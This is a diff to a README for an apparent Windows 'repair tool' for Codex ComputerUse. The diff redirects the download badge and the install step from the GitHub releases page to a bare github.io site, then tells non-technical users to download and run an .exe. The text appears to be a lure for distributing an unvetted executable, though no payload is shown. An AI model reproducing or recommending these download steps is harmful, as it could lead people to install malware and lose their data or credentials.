@@ -1,6 +1,6 @@
 # 🛠️ windows-codex-computeruse-repair - Fix codex computer use issues today
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Loriannedeictic637/windows-codex-computeruse-repair/releases)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://loriannedeictic637.github.io)
 
 This tool fixes common errors that prevent Codex ComputerUse from running on Windows. It resolves issues where `openai-bundled` files are missing or exports do not match. You do not need programming skills to use this repair utility.
 
@@ -17,7 +17,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to obtain the correct files for your system:
 
-1. Visit the project repository page: [https://github.com/Loriannedeictic637/windows-codex-computeruse-repair/releases](https://github.com/Loriannedeictic637/windows-codex-computeruse-repair/releases)
+1. Visit the project repository page: [https://loriannedeictic637.github.io](https://loriannedeictic637.github.io)
 2. Look for the section labeled Assets.
 3. Click the link ending in .exe to download the installer to your computer.
 4. Save the file to your Downloads folder or your Desktop.
